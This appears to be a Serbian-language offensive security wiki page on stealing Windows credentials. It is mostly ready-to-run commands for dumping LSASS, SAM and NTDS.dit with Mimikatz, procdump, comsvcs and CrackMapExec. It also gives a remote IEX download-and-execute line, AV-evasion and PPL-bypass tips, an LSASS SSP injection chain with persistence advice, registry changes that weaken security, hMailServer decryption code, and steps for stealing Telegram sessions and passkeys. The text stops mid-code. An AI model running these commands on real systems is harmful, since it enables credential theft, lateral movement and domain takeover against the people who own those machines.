# Krađa Windows akreditiva

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz akreditivi

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Saznajte šta još Mimikatz može da uradi na** [**ovoj stranici**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Saznajte više o nekim mogućim merama zaštite akreditiva ovde.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izvuče neke akreditive.**

## Akreditivi uz Meterpreter

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam kreirao da biste **pretražili lozinke i hash vrednosti** na žrtvinom sistemu.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Zaobilaženje AV-a

### Procdump + Mimikatz

Pošto je **Procdump iz** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**legitimni Microsoft alat**, Defender ga ne detektuje.\
Možete koristiti ovaj alat da **napravite dump lsass procesa**, **preuzmete dump** i **lokalno izdvojite** **kredencijale** iz dump-a.

Možete koristiti i [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Ovaj proces se obavlja automatski pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu **detektovati** upotrebu **procdump.exe za dumpovanje lsass.exe** kao **zlonamernu**. To je zato što **detektuju** nizove **„procdump.exe“ i „lsass.exe“**. Zato je **manje upadljivo** kao **argument** proslediti **PID** procesa lsass.exe programu procdump, **umesto** naziva **lsass.exe.**

### Dumpovanje lsass-a pomoću **comsvcs.dll**

DLL pod nazivom **comsvcs.dll**, koji se nalazi u `C:\Windows\System32`, odgovoran je za **dumpovanje memorije procesa** u slučaju pada. Ovaj DLL sadrži **funkciju** pod nazivom **`MiniDumpW`**, koju treba pozvati pomoću `rundll32.exe`.\
Prva dva argumenta nisu važna, ali je treći podeljen na tri komponente. Prvu komponentu čini ID procesa čiji dump treba napraviti, drugu lokacija dump datoteke, a treća mora biti tačno reč **full**. Druge opcije ne postoje.\
Nakon što obradi ove tri komponente, DLL kreira dump datoteku i u nju upisuje memoriju navedenog procesa.\
**comsvcs.dll** se može koristiti za dumpovanje procesa lsass, čime se uklanja potreba za otpremanjem i pokretanjem programa procdump. Ovaj metod je detaljno opisan na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Za izvršavanje se koristi sledeća komanda:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Ovaj proces možete automatizovati pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass pomoću Task Manager-a**

1. Kliknite desnim tasterom miša na traku zadataka, a zatim kliknite na Task Manager
2. Kliknite na More details
3. Na kartici Processes pronađite proces „Local Security Authority Process“
4. Kliknite desnim tasterom miša na proces „Local Security Authority Process“, a zatim kliknite na „Create dump file“.

### Dumping lsass pomoću procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft-ov potpisani binarni fajl koji je deo paketa [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Već postojeći dump pune sistemske memorije, ili njegova komprimovana kopija u dostupnoj korisničkoj fascikli, može sadržati materijal sa akreditivima za offline analizu. Nazivi fajlova kao što su `MEMORY.DMP` i `MEMORY.7z` samo su naznake za pregled: proverite poreklo i pristup i nemojte pretpostavljati da sadrže upotrebljive ili aktuelne akreditive.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping lsass pomoću PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je alat za dumpovanje Protected Process procesa koji podržava prikrivanje memory dump-a i njegovo prenošenje na udaljene radne stanice bez upisivanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Prikrivanje memory dump datoteka radi izbegavanja Defender mehanizama za detekciju zasnovanih na potpisima
3. Otpremanje memory dump-a pomoću RAW i SMB metoda, bez upisivanja na disk (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – LSASS dumping zasnovan na SSP-u bez MiniDumpWriteDump

Ink Dragon koristi dumper u tri faze pod nazivom **LalsDumper**, koji nikada ne poziva `MiniDumpWriteDump`, pa se EDR hook-ovi na tom API-ju nikada ne aktiviraju:<sup>[[3]](#references)</sup>

1. **Loader prve faze (`lals.exe`)** – traži placeholder koji se sastoji od 32 mala slova `d` u `fdp.dll`, zamenjuje ga apsolutnom putanjom do `rtu.txt`, čuva izmenjeni DLL kao `nfdp.dll` i poziva `AddSecurityPackageA("nfdp","fdp")`. Time se **LSASS** primorava da učita zlonamerni DLL kao novi Security Support Provider (SSP).
2. **Druga faza unutar LSASS-a** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, XOR-uje svaki bajt sa `0x20` i mapira dekodirani blob u memoriju pre nego što preda izvršavanje.
3. **Dumper treće faze** – mapirani payload ponovo implementira MiniDump logiku koristeći **direktne sistemske pozive**, razrešene pomoću hashovanih API naziva (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Namenski export pod nazivom `Tom` otvara `%TEMP%\<pid>.ddt`, upisuje kompresovani LSASS dump u fajl i zatvara handle kako bi eksfiltracija mogla da se obavi kasnije.

Napomene za operatera:

* Držite `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` u istom direktorijumu. Prva faza zamenjuje hardkodirani placeholder apsolutnom putanjom do `rtu.txt`, pa njihovo razdvajanje prekida lanac.
* Registracija se obavlja dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Tu vrednost možete sami upisati kako bi LSASS ponovo učitavao SSP pri svakom pokretanju sistema.
* Fajlovi `%TEMP%\*.ddt` su kompresovani dump-ovi. Dekompresujte ih lokalno, a zatim ih prosledite alatima Mimikatz/Volatility za izvlačenje kredencijala.
* Za pokretanje `lals.exe` potrebna su administratorska ili SeTcb prava da bi `AddSecurityPackageA` uspeo; kada se poziv završi, LSASS transparentno učitava lažni SSP i izvršava drugu fazu.
* Uklanjanje DLL-a sa diska ne izbacuje ga iz LSASS-a. Ili obrišite stavku iz registra i ponovo pokrenite LSASS (restartujte sistem), ili ostavite DLL radi dugotrajne perzistencije.

## CrackMapExec

### Izvlačenje SAM hash-eva

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dumpovanje NTDS.dit sa ciljnog DC-a

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump istorije lozinki iz NTDS.dit fajla sa ciljnog DC-a

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Prikažite atribut pwdLastSet za svaki nalog u NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Krađa SAM-a i SYSTEM-a

Ove datoteke treba da budu **smeštene** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih samo kopirati na uobičajen način** jer su zaštićene.

### Iz registra

Najlakši način da ukradete te datoteke jeste da napravite njihovu kopiju iz registra:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Preuzmite** te datoteke na svoju Kali mašinu i **izvucite hash-eve** pomoću:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Možete da kopirate zaštićene datoteke pomoću ove usluge. Potrebna su vam administratorska prava.

#### Korišćenje vssadmin

Binarna datoteka vssadmin dostupna je samo u verzijama Windows Server-а

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ali isto možete uraditi iz **Powershell**-a. Ovo je primer **kako da kopirate SAM datoteku** (korišćeni čvrsti disk je „C:“ i ona se čuva u C:\users\Public), ali ovo možete koristiti za kopiranje bilo koje zaštićene datoteke:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Kod iz knjige: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Na kraju, možete koristiti i [**PS skriptu Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju datoteka SAM, SYSTEM i ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory akreditivi - NTDS.dit**

Datoteka **NTDS.dit** poznata je kao srce **Active Directory**-ja i sadrži ključne podatke o korisničkim objektima, grupama i njihovom članstvu. U njoj se čuvaju **hash vrednosti lozinki** korisnika domena. Ova datoteka je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na putanji **_%SystemRoom%/NTDS/ntds.dit_**.

U ovoj bazi podataka održavaju se tri primarne tabele:

- **Data Table**: Ova tabela čuva detalje o objektima, kao što su korisnici i grupe.
- **Link Table**: Prati odnose, kao što je članstvo u grupama.
- **SD Table**: Ovde se čuvaju **bezbednosni deskriptori** za svaki objekat, čime se obezbeđuju sigurnost i kontrola pristupa sačuvanim objektima.

Istraživanje Christoffera Anderssona o sloju baze podataka detaljnije opisuje ove tabele i njihovo ponašanje u zavisnosti od verzije.<sup>[[8]](#references)</sup>

Windows koristi _Ntdsa.dll_ za rad s tom datotekom, a koristi ga i _lsass.exe_. Zatim se **deo** datoteke **NTDS.dit** može nalaziti **u memoriji `lsass`** (verovatno možete pronaći poslednje pristupljene podatke zahvaljujući unapređenju performansi koje omogućava **cache**).

#### Dešifrovanje hash vrednosti u NTDS.dit

Hash se šifruje tri puta:

1. Dešifrujte ključ za šifrovanje lozinki (**PEK**) pomoću **BOOTKEY**-ja i **RC4**-a.
2. Dešifrujte **hash** pomoću **PEK**-a i **RC4**-a.
3. Dešifrujte **hash** pomoću **DES**-a.

**PEK** ima **istu vrednost na svakom kontroleru domena**, ali je **šifrovan** unutar datoteke **NTDS.dit** pomoću **BOOTKEY**-ja specifičnog za taj kontroler domena, iz njegovog **SYSTEM** hive-a. Zato su za izvlačenje akreditiva potrebne i datoteke **NTDS.dit** i **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Zasebna [tehnika preusmeravanja kernel tabele handle-ova](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) može da kopira već otvoren objekat NTDS datoteke bez VSS-a, ali zahteva proizvoljan kernel read/write primitivan na kontroleru domena.<sup>[[16]](#references)</sup>

### Kopiranje NTDS.dit pomoću Ntdsutil

Dostupno od Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Možete da iskoristite i trik sa [**volume shadow copy**](#stealing-sam-and-system) da kopirate datoteku **ntds.dit**. Imajte na umu da će vam biti potrebna i kopija datoteke **SYSTEM** (opet, možete da je [**izvezete iz registra ili iskoristite trik sa volume shadow copy**](#stealing-sam-and-system)).

### **Izdvajanje hash vrednosti iz NTDS.dit**

Kada **nabavite** datoteke **NTDS.dit** i **SYSTEM**, možete da koristite alate kao što je _secretsdump.py_ da **izdvojite hash vrednosti**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Možete ih i **automatski izdvojiti** koristeći važećeg domain admin korisnika:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Za **velike NTDS.dit datoteke** preporučuje se izdvajanje pomoću alata [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na kraju, možete koristiti i **Metasploit modul**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Izdvajanje objekata domena iz NTDS.dit datoteke u SQLite bazu podataka**

NTDS objekte možete izdvojiti u SQLite bazu podataka pomoću alata [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Izdvajaju se ne samo tajne već i celi objekti i njihovi atributi, što omogućava dalju ekstrakciju informacija kada je sirova NTDS.dit datoteka već pribavljena.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive је опционалан, али омогућава дешифровање тајни (NT и LM hash-eva, додатних акредитива као што су лозинке у отвореном тексту, kerberos или trust кључеви, историја NT и LM лозинки). Поред других информација, издвајају се следећи подаци: кориснички и машински налози са њиховим hash-евима, UAC заставице, временске ознаке последње пријаве и промене лозинке, описи налога, имена, UPN, SPN, групе и рекурзивна чланства, стабло организационих јединица и чланство, поуздани домени са типовима, смеровима и атрибутима поверења...

## Lazagne

Преузмите бинарну датотеку [овде](https://github.com/AlessandroZ/LaZagne/releases). Ову бинарну датотеку можете да користите за издвајање акредитива из неколико софтверских програма.

```
lazagne.exe all
```

## Drugi alati za izvlačenje akreditiva iz SAM-a i LSASS-a

### Windows credentials Editor (WCE)

Ovaj alat može da se koristi za izvlačenje akreditiva iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Izvucite akreditive iz SAM datoteke

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Izvucite akreditive iz SAM datoteke

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Preuzmite ga sa:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo ga **pokrenite** da biste izdvojili lozinke.

## Prikupljanje podataka iz neaktivnih RDP sesija i slabljenje bezbednosnih kontrola

FinalDraft RAT grupe Ink Dragon sadrži zadatak `DumpRDPHistory`, čije su tehnike korisne svakom red-teameru:<sup>[[3]](#references)</sup>

### Prikupljanje telemetrijskih podataka u stilu DumpRDPHistory

* **Odredišta odlaznih RDP veza** – raščlanite svaki korisnički hive na putanji `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki potključ čuva ime servera, `UsernameHint` i vreme последњег уписа. Логику FinalDraft-а можете да поновите помоћу PowerShell-а:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Dokazi o dolaznim RDP vezama** – pretražite evidenciju `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` za ID-jeve događaja **21** (uspešna prijava) i **25** (prekid veze) da biste utvrdili ko je administrirao računar:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Kada saznate koji Domain Admin se redovno povezuje, dumpujte LSASS (pomoću LalsDumper/Mimikatz) dok njegova **prekinuta** sesija još postoji. CredSSP + NTLM fallback ostavlja njegov verifier i tokene u LSASS-u, koje zatim možete ponovo upotrebiti preko SMB/WinRM-a da biste preuzeli `NTDS.dit` ili uspostavili persistence na kontrolerima domena.

### Snižavanje bezbednosti registra koje cilja FinalDraft

Isti implant takođe menja nekoliko ključeva registra kako bi olakšao krađu akreditiva:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` onemogućava Restricted Admin za dolazni RDP; **ne** omogućava pass-the-hash kroz taj režim. Postavljanje vrednosti na `0` dozvoljava Restricted Admin na odredištu, ali klijent mora da zatraži `/RestrictedAdmin` ili da koristi polisu koja zahteva Restricted Admin.<sup>[[14]](#references)</sup> Sam hash ne daje udaljena administratorska prava; pogledajte [preduslove za RDP autentifikaciju](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` onemogućava UAC filtriranje tokena, tako da lokalni administratori dobijaju neograničene tokene preko mreže.
* `DSRMAdminLogonBehavior=2` omogućava DSRM administratoru da se prijavi dok je DC na mreži, čime napadači dobijaju još jedan ugrađeni nalog sa visokim privilegijama.
* `RunAsPPL=0` uklanja LSASS PPL zaštitu, čineći pristup memoriji trivijalnim za alate za dumpovanje kao što je LalsDumper.

## Akreditivi konfiguracije hMailServer-a (nakon kompromitovanja)

Proverite tačne konfiguracione datoteke `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` i `C:\ProgramData\hMailServer\hMailServer.ini`, u skladu sa rasporedom instalacije. Čitljiva, neprazna vrednost `[Security] AdministratorPassword=` predstavlja hash administratorske lozinke za hMailServer; ona nije dokaz da je reč o lozinci Windows Administrator naloga. Ako se taj akrediti oporavi, za svaki prelazak na Windows nalog potrebno je nezavisno potvrditi ponovnu upotrebu lozinke i prava prijavljivanja.

Kod instalacija koje koriste SQL CE bazu podataka, zasebna vrednost `[Database] Password=` u INI datoteci štiti bazu podataka. U starijim instalacijama ova vrednost je Blowfish šifrovana statičkim ključem `THIS_KEY_IS_NOT_SECRET` i zamenom redosleda bajtova u 4-bajtnim rečima. Koristite heksadecimalni niz iz INI datoteke uz ovaj Python isečak:<sup>[[2]](#references)</sup>

Najpre potvrdite da trenutni nalog može da čita **i** INI datoteku **i** odgovarajuću SQL CE `.sdf` bazu podataka. Lozinka iz INI datoteke štiti bazu podataka; ona je odvojena od hash vrednosti lozinki poštanskih sandučića koje se u njoj čuvaju. Pregledajte ili nadogradite **kopiju** baze podataka koja je u upotrebi; nikada ne radite sa aktivnom datotekom.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Pomoću lozinke u čistom tekstu, kopirajte SQL CE bazu podataka da biste izbegli zaključavanje datoteke, učitajte 32-bitni provider i izvršite nadogradnju ako je potrebno pre nego što upitate hash vrednosti:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Kolona `accountpassword` koristi hMailServer format heša (hashcat režim `1421`). Probijena lozinka za poštansko sanduče može da posluži kao Windows korisnički nalog za prelazak samo ako istu lozinku koristi lokalni/domenski nalog i taj nalog ima potrebna prava za udaljenu prijavu.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Neki alati prikupljaju **lozinke za prijavu u plaintext obliku** tako što presreću LSA povratni poziv za prijavu `LsaApLogonUserEx2`. Ideja je da se zakači ili obmota povratni poziv paketa za autentifikaciju kako bi se akreditivi prikupili **tokom prijave** (pre heširanja), a zatim upisali na disk ili prosledili operatoru. Ovo se obično implementira kao pomoćni program koji se ubacuje u LSA ili se registruje kod njega, a zatim beleži svaki uspešan interaktivni/mrežni događaj prijave, zajedno sa korisničkim imenom, domenom i lozinkom.<sup>[[1]](#references)</sup>

Operativne napomene:
- Potrebna su lokalna administratorska/SYSTEM prava da bi se pomoćni program učitao u putanju za autentifikaciju.
- Prikupljeni akreditivi se pojavljuju samo kada dođe do prijave (interaktivne, RDP, uslužne ili mrežne, u zavisnosti od zakačivanja).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) čuva informacije o sačuvanim vezama u korisničkom fajlu `sqlstudio.bin`. Namenski alati za izvlačenje podataka mogu da parsiraju fajl i povrate sačuvane SQL akreditive. U komandnim okruženjima koja vraćaju samo izlaz komande, fajl se često eksfiltrira tako što se kodira kao Base64 i ispisuje na stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Na strani operatera, ponovo izgradite datoteku i pokrenite dumper lokalno da biste povratili pristupne podatke:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Krađa sesije pregledača i kolačića putem Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Krađa Telegram Desktop sesije `tdata`

Telegram Desktop čuva stanje autorizacije i naloga u svom direktorijumu **`tdata`**. Kopirana sesija može da se učita pomoću kompatibilnih alata i da se autentifikuje bez lozinke naloga, sve dok je ta autorizacija važeća; ako je uključeno šifrovanje lokalnih podataka, kradljivcu su potrebni i podaci za pristup. Autentifikovana sesija zatim može da otkrije podatke o identitetu, metapodatke o razgovorima i članstvima, poruke i medijske fajlove koji mogu da se preuzmu.<sup>[[10]](#references)</sup>

### Pronalaženje i pribavljanje

Pretražite i instalirane i prenosive rasporede; nazivi paketa Microsoft Store-a se razlikuju, pa nabrojte direktorijume paketa koji sadrže `TelegramMessenge` i pregledajte njihovo podstablo `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Ako obična čitanja ne uspeju, a token procesa **već sadrži i omogućava** `SeBackupPrivilege`, pristup koji podržava backup predstavlja rezervnu opciju; on ne pribavlja tu privilegiju niti podiže nivo privilegija procesa. `CreateFileW` sa `FILE_FLAG_BACKUP_SEMANTICS` može da zatraži semantiku backup/restore i zaobiđe provere bezbednosti fajla kada su potrebne privilegije tokena prisutne, ali sama zastavica ne zaobilazi nekompatibilno zaključavanje deljenja.<sup>[[10]](#references)[[11]](#references)</sup>

Za fajlove koji su trenutno zaključani, napravite/pročitajte **Volume Shadow Copy**; za fajlove blokirane ACL-om, `robocopy /B` koristi backup režim i zaobilazi ACL-ove fajlova i direktorijuma.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Implant koji vodi računa o propusnom opsegu može prvo da pošalje samo popis putanja datoteka, da dobije identifikator snimka stanja i putanje koje C2 već čuva, a zatim da otpremi samo datoteke koje nedostaju. Zato i mali inkrementalni prenosi nakon rekurzivnog popisivanja `tdata` mogu ukazivati na uspešnu krađu sesije.<sup>[[10]](#references)</sup>

### Otkrivanje i obuzdavanje

Povežite rekurzivni pristup fascikli `tdata` od strane procesa koji nije Telegram sa omogućavanjem `SeBackupPrivilege`, otvaranjem datoteka uz backup semantiku, VSS aktivnošću ili podređenim `robocopy.exe` procesom koji koristi `/B`. Потражите и brzo popisivanje fascikli `%APPDATA%` i `%LOCALAPPDATA%\Packages`, nakon čega slede odlazne veze istog procesa. Nakon kompromitovanja, koristite **Podešavanja → Uređaji** (ili **Privatnost i bezbednost → Aktivne sesije**) da biste prekinuli neprepoznate sesije; samo uključivanje verifikacije u dva koraka ne opoziva ovlašćenje koje je već ukradeno.<sup>[[10]](#references)[[13]](#references)</sup>

## Krađa passkeys / WebAuthn akreditiva iz Chrome-a u Windows-u

Ako se izvršavanje koda ostvari kao **korisnik žrtva** na Windows hostu koji koristi **Chrome + sinhronizovane passkeys iz Google Password Manager-a**, passkeys postaju zanimljiva meta nakon eksploatacije, čak i **bez administratorskih privilegija/SYSTEM**.<sup>[[4]](#references)</sup>

### Zanimljivi lokalni artefakti

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** čuva protobuf-enkodirane zapise **`WebauthnCredentialSpecifics`**. Proces pokrenut pod istim korisnikom može da izlista **RP ID**, **username**, **credential ID** i šifrovani materijal privatnog ključa za sinhronizovane passkeys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** čuva stanje lokalnog upisa uređaja, kao što su **`wrapped_identity_private_key`** i umotana tajna koja se koristi za oporavak sinhronizovanih kredencijala.<sup>[[4]](#references)</sup>

Brza trijaža:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-vezani blobovi ključeva i dalje mogu da se zloupotrebe kao lokalni oracle za potpisivanje

Ako pregledač izveze identitetski ključ zaštićen TPM-om kao **`NCRYPT_OPAQUE_KEY_BLOB`** i sačuva taj blob u stanju dostupnom korisniku, malware **ne mora** da izvuče sirovi privatni ključ. Može jednostavno ponovo da uveze blob na **istoj mašini** i zatraži od lokalnog TPM-a da potpiše podatke koje kontroliše napadač:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
